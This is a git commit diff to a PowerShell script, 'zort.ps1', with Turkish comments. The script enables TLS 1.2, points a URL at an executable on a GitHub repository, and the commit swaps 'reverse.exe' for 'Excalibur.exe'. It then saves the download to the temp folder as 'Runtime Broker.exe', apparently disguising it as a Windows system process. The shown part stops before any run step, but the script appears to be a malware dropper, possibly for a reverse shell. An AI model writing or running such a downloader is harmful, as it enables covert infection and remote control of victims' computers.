ce71d57cc200617aafc525c6cdcdb1752422cb4e
OhioDucky <138029280+OhioDucky@users.noreply.github.com>
2024-01-27 03:39:43 +0300

    Update zort.ps1

--- zort.ps1
+++ zort.ps1
@@ -1,7 +1,7 @@
 # TLS 1.2'yi etkinleştir
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$url = 'https://github.com/OhioDucky/awsomesites.github.io/raw/main/reverse.exe'
+$url = 'https://github.com/OhioDucky/awsomesites.github.io/raw/main/Excalibur.exe'
 $tempPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'Runtime Broker.exe')
 
 # Güvenli bir şekilde dosyayı indir
